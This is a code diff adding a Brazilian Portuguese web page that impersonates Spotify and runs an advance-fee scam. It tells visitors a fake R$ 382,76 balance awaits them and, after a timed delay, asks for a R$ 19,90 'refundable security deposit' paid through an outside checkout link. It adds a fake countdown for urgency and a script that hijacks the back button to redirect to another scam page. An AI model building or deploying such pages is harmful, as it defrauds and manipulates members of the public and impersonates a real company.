@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify</title>
+  
+  <script async="" src="https://www.clarity.ms/tag/uem62uib5t"></script><script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "uem62uib5t");
+</script>
+
+  <!-- FONT GOOGLE POPPINS -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      justify-content: space-around;
+      display: flex;
+      flex-direction: column;
+      background-color: rgb(24, 24, 24);
+      align-items: center;
+    }
+    .centralizado {
+      margin-top: 70px;
+      width: 300px;
+      background-color: rgb(0, 0, 0);
+      text-align: center;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      border-radius: 10px;
+    }
+    * {
+      font-family: "Poppins", sans-serif;
+      color: white;
+      padding: 0px;
+    }
+    #logocentral {
+      width: 90px;
+    }
+    #textoprincipalsptfy {
+      font-size: 23px;
+      margin: 20px 0px;
+      font-weight: 700;
+    }
+    #descricaoiniciospotify {
+      color: rgb(168, 168, 168);
+      margin-top: -10px;
+      margin-bottom: -10px;
+      font-size: 14px;
+    }
+    #descricaoiniciospotifyy {
+      color: rgb(168, 168, 168);
+      font-size: 14px;
+      font-weight: 500;
+    }
+    #logincadastro {
+      display: flex;
+      font-size: 15px;
+      width: 100%;
+      flex-direction: column;
+      text-align: left;
+    }
+    #meuBotao {
+      display: block;
+      padding: 13px 10px;
+      background-color: gray;
+      color: white;
+      margin-top: 20px;
+      border-radius: 50px;
+      border: 1px solid gray;
+      text-decoration: none;
+      width: 90%;
+      font-weight: 600;
+      text-align: center;
+      pointer-events: none;
+    }
+    #topoFixo {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #000000;
+      color: white;
+      padding: 15px 10px;
+      align-items: center;
+      display: flex;
+      justify-content: space-between;
+      text-align: center;
+    }
+    #logo {
+      width: 130px;
+    }
+    #saldoatual {
+      padding: 10px 15px;
+      border-radius: 10px;
+      margin-right: 20px;
+      background-color: rgb(7, 187, 52);
+    }
+    #txtnotificacao {
+      color: white;
+    }
+    #notificacao {
+      background-color: rgba(1, 214, 97, 0.434);
+      display: flex;
+      margin-top: -10px;
+      align-items: center;
+      margin-bottom: 20px;
+      text-align: center;
+      font-size: 14px;
+      justify-content: center;
+      width: 100%;
+      border-radius: 10px;
+      border: 1px solid rgb(1, 214, 97);
+    }
+
+    /* CENTRALIZAR O VÍDEO */
+    .video-container {
+      width: 100%;
+      margin: 15px 0;
+      display: flex;
+      justify-content: center;
+    }
+
+    /* ESCONDER ELEMENTOS COM DELAY */
+    .hidden {
+      display: none;
+    }
+    .link-verde {
+  color: rgb(1, 214, 97);
+  font-weight: 500;
+  text-decoration: none;
+}
+
+.link-verde:hover {
+  text-decoration: underline;
+}
+  </style>
+
+
+<body>
+  <!-- TOPO FIXO -->
+  <div id="topoFixo">
+    <img src="images/logo.png" id="logo">
+    <div id="saldoatual">Saldo: R$ 382,76</div>
+  </div>
+
+  <div class="centralizado">
+    <!-- IMAGEM DA LOGO -->
+    <img src="images/logowhite.png" id="logocentral">
+
+     <!-- TEXTO POP UP -->
+    <div id="textoprincipalsptfy">
+      ATENÇÃO, <b id="mensagem">...</b>!
+    </div>
+
+    <div id="notificacao">
+      <p id="txtnotificacao">
+        Assista o vídeo até o final para liberar o envio de <b>R$ 382,76</b> para sua chave Pix cadastrada <b id="pix">.</b>
+      </p>
+    </div>
+
+    <!-- 🔥 VÍDEO DA VTURB AQUI – CENTRALIZADO 🔥 -->
+<div class="video-container">
+  <vturb-smartplayer id="vid-69b46295005f4e6dadab7d82" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
+</div>
+
+<script type="text/javascript">
+  var s = document.createElement("script");
+  s.src = "https://scripts.converteai.net/03a04fd3-6c6a-4947-a776-be74db4d45b1/players/69b46295005f4e6dadab7d82/v4/player.js";
+  s.async = true;
+  document.head.appendChild(s);
+</script>
+
+<script>
+  !function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);
+</script>
+
+<link rel="preload" href="https://scripts.converteai.net/03a04fd3-6c6a-4947-a776-be74db4d45b1/players/69b46295005f4e6dadab7d82/v4/player.js" as="script">
+<link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+<link rel="preload" href="https://cdn.converteai.net/03a04fd3-6c6a-4947-a776-be74db4d45b1/69b46291ee2947d3ff2dfeb8/main.m3u8" as="fetch">
+<link rel="dns-prefetch" href="https://cdn.converteai.net">
+<link rel="dns-prefetch" href="https://scripts.converteai.net">
+<link rel="dns-prefetch" href="https://images.converteai.net">
+<link rel="dns-prefetch" href="https://api.vturb.com.br">
+
+
+    <!-- DESCRICAO COM DELAY (COMEÇA ESCONDIDA) -->
+    <p id="descricaoiniciospotify" class="hidden">
+      <b>ATENÇÃO: Reembolso 100% Garantido!</b><br><br>
+
+      Esta taxa de R$ 19,90 não é um custo, mas sim um depósito de segurança.<br><br>
+
+      Você receberá o valor integral de <b>R$ 19,90</b> de volta junto com a sua primeira
+      transferência de saldo. É a nossa garantia de que estamos focados em sua segurança
+      e no seu sucesso.<br><br>
+
+      Seu saldo está retido e a reserva expira em
+      <span id="timer" style="font-weight:700; color:rgb(1,214,97);">09:59</span>.<br><br>
+
+      Não perca o valor que você conquistou.
+    </p>
+
+    <!-- BOTÃO COM LINK -->
+    <a href="#" id="meuBotao">LIBERANDO SAQUE...</a>
+
+    <script>
+      function obterParametroDaUrl(nome) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(nome);
+      }
+
+      const nome = obterParametroDaUrl("nome");
+      const pix = obterParametroDaUrl("pix");
+
+      if (nome) {
+        document.getElementById("mensagem").innerText = `${nome}`;
+      }
+      if (pix) {
+        document.getElementById("pix").innerText = `${pix}`;
+      }
+
+      function mudarBotao() {
+        const botao = document.getElementById("meuBotao");
+        botao.style.backgroundColor = "rgb(1, 214, 97)";
+        botao.style.borderColor = "rgb(1, 214, 97)";
+        botao.style.cursor = "pointer";
+        botao.innerText = "FINALIZAR VERIFICAÇÃO E RECEBER";
+        botao.style.pointerEvents = "auto";
+
+        botao.onclick = function (e) {
+          e.preventDefault();
+          const baseUrl = "https://pay.conexaoescala.shop/69b46477b65583296e4d28f6";
+          const params = new URLSearchParams(window.location.search);
+          const utms = ["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content"]
+            .map(param => {
+              const value = params.get(param);
+              return value ? `${param}=${encodeURIComponent(value)}` : "";
+            })
+            .filter(Boolean)
+            .join("&");
+
+          const finalUrl = utms ? `${baseUrl}?${utms}` : baseUrl;
+
+          if (typeof utmify !== "undefined") {
+            utmify.redirect(finalUrl);
+          } else {
+            window.location.href = finalUrl;
+          }
+        };
+      }
+
+       // ⏱ DELAY DO BOTÃO – 1:30 (90s)
+setTimeout(mudarBotao, 90000);
+
+// ⏱ DELAY DOS TEXTOS – 1:30 (90s)
+function mostrarDescricao() {
+  const desc = document.getElementById("descricaoiniciospotify");
+  if (desc) {
+    desc.classList.remove("hidden");
+  }
+}
+setTimeout(mostrarDescricao, 90000);
+    </script>
+
+    <p id="descricaoiniciospotifyy">
+  Este site é protegido pelo reCAPTCHA e está sujeito à 
+  <a href="https://www.spotify.com/br-pt/legal/privacy-policy/" target="_blank" class="link-verde">
+    Política de Privacidade
+  </a>
+  e aos 
+  <a href="https://policies.google.com/terms?hl=pt-BR" target="_blank" class="link-verde">
+    Termos de Serviço do Google
+  </a>.
+</p>
+  </div>
+
+  <!-- SCRIPT DO UTMFY -->
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <!-- CRONÔMETRO -->
+  <script>
+    let time = 600; // 10 minutos = 600 segundos
+
+    function formatTime(seconds) {
+      let min = Math.floor(seconds / 60);
+      let sec = seconds % 60;
+      return `${min < 10 ? "0" : ""}${min}:${sec < 10 ? "0" : ""}${sec}`;
+    }
+
+    function startTimer() {
+      const timerElement = document.getElementById("timer");
+
+      const countdown = setInterval(() => {
+        time--;
+
+        // Atualiza o texto do cronômetro
+        timerElement.innerText = formatTime(time);
+
+        // Muda para vermelho nos últimos 30 segundos
+        if (time <= 30) {
+          timerElement.style.color = "rgb(255, 70, 70)";
+        }
+
+        // Quando acaba
+        if (time <= 0) {
+          clearInterval(countdown);
+          timerElement.innerText = "00:00";
+        }
+      }, 1000);
+    }
+
+    startTimer();
+  </script>
+  
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script>
+    // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+    const link = 'https://respondasptfy.online/back/02/';
+
+    function setBackRedirect(url) {
+      let urlBackRedirect = url;
+      urlBackRedirect = urlBackRedirect =
+        urlBackRedirect.trim() +
+        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+        document.location.search.replace('?', '').toString();
+
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+
+      window.addEventListener('popstate', () => {
+        console.log('onpopstate', urlBackRedirect);
+        setTimeout(() => {
+          location.href = urlBackRedirect;
+        }, 1);
+      });
+    }
+
+    setBackRedirect(link);
+  </script>
+
+</body></html>
